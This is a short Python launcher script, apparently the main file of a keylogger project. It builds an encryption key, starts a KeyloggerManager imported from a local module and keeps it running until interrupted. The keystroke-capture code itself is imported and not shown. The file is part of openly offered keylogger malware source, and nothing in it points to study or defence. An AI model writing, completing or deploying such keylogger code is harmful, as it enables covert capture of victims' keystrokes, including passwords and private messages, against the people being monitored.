import time

from create_encryption_key import CreateKey
from keylogger_manager import KeyloggerManager

if __name__ == "__main__":
    key = CreateKey().key
    keylogger = KeyloggerManager(key)
    keylogger.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping...")
        keylogger.stop()
